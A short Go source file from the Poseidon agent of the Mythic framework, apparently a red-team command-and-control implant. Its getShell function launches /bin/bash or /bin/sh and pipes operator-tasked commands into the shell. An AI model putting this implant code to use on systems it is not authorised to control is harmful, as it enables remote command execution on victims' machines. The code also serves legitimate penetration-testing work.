// +build darwin linux

package shell

import (
	// Standard
	"errors"
	"os"
	"os/exec"
	"strings"
	
	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"

)

func getShell(task structs.Task) (*exec.Cmd, error) {
	shellBin := "/bin/bash"
	cmd := exec.Command(shellBin)
	if _, err := os.Stat(shellBin); err != nil {
		if _, err = os.Stat("/bin/sh"); err != nil {
			err := errors.New("Could not find /bin/bash or /bin/sh")
			return cmd, err
		} else {
			cmd = exec.Command("/bin/sh")
		}
	}

	cmd.Stdin = strings.NewReader(task.Params)

	return cmd, nil
}